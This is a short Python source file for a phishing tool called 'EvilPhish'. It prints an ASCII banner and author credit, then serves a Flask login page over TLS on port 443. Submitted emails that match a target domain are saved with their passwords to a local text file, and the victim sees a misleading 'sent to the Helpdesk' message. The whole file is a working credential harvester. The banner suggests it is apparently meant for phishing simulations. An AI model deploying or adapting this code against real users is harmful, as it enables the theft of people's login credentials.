def print_ascii_art():
    ascii_art = """
               
                (      (        (         )   (      (         )  
                )\ )   )\ )     )\ )   ( /(   )\ )   )\ )   ( /(  
 (     (   (   (()/(  (()/(    (()/(   )\()) (()/(  (()/(   )\())
 )\    )\  )\   /(_))  /(_))    /(_)) ((_)\   /(_))  /(_)) ((_)\  
((_)  ((_)((_) (_))   (_))     (_))    _((_) (_))   (_))    _((_)
| __| \ \ / /  |_ _|  | |      | _ \  | || | |_ _|  / __|  | || |
| _|   \ V /    | |   | |__    |  _/  | __ |  | |   \__ \  | __ |
|___|   \_/    |___|  |____|   |_|    |_||_| |___|  |___/  |_||_|

    """
    author = "Written by: Justin Henderson - whisk3y3"
    github = "https://github.com/whisk3y3/EvilPhish"
    version = "Version 1.0"
    print(ascii_art)
    print(author)
    print(github)
    print(version)
    print()
    print("Happy Hunting!")
    print()
print_ascii_art()

from flask import Flask, render_template, request
import ssl

app = Flask(__name__)

def log_credentials(email, password):
    with open('credentials.txt', 'a') as f:
        f.write(f"Email: {email}, Password: {password}\n")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')

    if email.endswith('@evilphishinc.com') and len(password) >= 8:
        log_credentials(email, password)
        return 'Your results have been sent to the Helpdesk. You may close your browser.'
    else:
        return 'Invalid credentials'

if __name__ == '__main__':
    cert_file = 'fullchain.pem'
    key_file = 'privkey.pem'
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert_file, key_file)

    app.run(host='0.0.0.0', port=443, ssl_context=context)
